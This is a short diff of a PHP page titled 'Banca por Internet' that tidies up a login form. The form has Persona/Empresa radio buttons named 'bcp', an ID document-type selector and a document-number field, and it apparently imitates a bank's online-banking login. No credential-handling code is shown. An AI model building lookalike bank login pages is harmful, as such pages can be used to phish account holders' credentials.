@@ -40,33 +40,9 @@ if (isset($_POST['submit'])) {
 
             <h3 class="fw-bold text-center pt-5 mb-5 color-titulo">Banca por Internet</h3>
 
-
-                <h3 class="fw-bold text-center pt-5 mb-5 color-titulo">Banca por Internet</h3>
-                <!-- Formulario -->
-                <form action="#" method="post" novalidate class="form-padre" id="formulario">
-                    <div class="opciones">
-
-                        <label class="radio">
-                            <input type="radio" name="bcp" id="Green" id="persona" value="personas" checked> Persona
-                            <span></span>
-                        </label>
-                        <label class="radio">
-                            <input type="radio" name="bcp" id="Green" id="empresa" value="empresas"> Empresa
-                            <span></span>
-                        </label>
-
-                    </div>
-                    <div class="Documentos">
-                        <select name="DNI" id="documentos form-control" class="form-select selec-docu select">
-                            <option value="1">DNI</option>
-                            <option value="2">CE</option>
-                            <option value="3">PAS</option>
-                        </select>
-
-                        <input type="text" class="form-control ancho-input" name="numeroDocumento" id="docu" placeholder="Nro de documento">
-
-                    </div>
-
+            <!-- Formulario -->
+            <form method="post" class="form-padre" id="formulario">
+                <div class="opciones">
 
 
 
